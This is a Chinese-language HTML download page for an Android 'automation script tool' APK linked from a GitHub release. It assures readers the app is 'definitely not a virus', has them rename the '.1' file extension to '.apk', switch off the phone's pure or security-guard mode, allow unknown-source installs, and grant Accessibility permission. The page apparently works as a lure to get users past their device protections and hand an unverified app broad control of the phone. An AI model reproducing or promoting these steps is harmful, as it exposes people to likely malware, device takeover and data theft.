<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自動化工具下載</title>
    <style>
        body{font-family:'Microsoft JhengHei',sans-serif;text-align:center;padding:30px;background:#f5f5f5;margin:0}
        .box{max-width:500px;margin:40px auto;background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1)}
        h1{color:#333;font-size:24px;margin-bottom:10px}
        .subtitle{color:#666;font-size:16px;margin-bottom:20px}
        .btn{display:inline-block;padding:14px 40px;background:#007bff;color:#fff;text-decoration:none;border-radius:30px;font-size:18px;font-weight:bold;transition:background 0.2s;box-shadow:0 4px 10px rgba(0,123,255,0.3)}
        .btn:hover{background:#0056b3}
        .tip{margin-top:30px;padding-top:20px;border-top:1px dashed #ddd;color:#444;font-size:14px;text-align:left;line-height:1.6}
        .tip p{margin:6px 0}
        .warning{color:#d9534f;font-weight:bold}
    </style>
</head>
<body>
    <div class="box">
        <h1>自動化腳本工具</h1>
        <p class="subtitle">安全防護版發行</p>
        
        <a href="https://github.com/pm0629/base/releases/download/v1.0/base.apk.1" class="btn" download>立即下載 APK 檔案</a>
        
        <div class="tip">
            <p class="warning">⚠️ 安裝前必看安全說明：</p>
            <p>本軟體為安卓自動化工具，因需要開啟<strong>「無障礙權限」</strong>，部分手機管家可能會誤報為風險軟體，請放心，本程式<strong>絕非病毒</strong>。</p>
            
            <p style="margin-top: 15px; font-weight: bold;">✅ 安裝與設定步驟：</p>
            <p>1. 下載完成後，若檔名結尾有多的數字（如 .1），請手動重新命名刪除，讓副檔名保持為 <code>.apk</code>。</p>
            <p>2. 請先關閉手機的「純淨模式」或「安全守護模式」。</p>
            <p>3. 允許瀏覽器或檔案管理員的「安裝未知來源應用」權限。</p>
            <p>4. 安裝完成後，請至手機的「設定」->「無障礙功能（輔助程式）」中，找到本工具並開啟權限，腳本即可正常運作。</p>
        </div>
    </div>
</body>
</html>
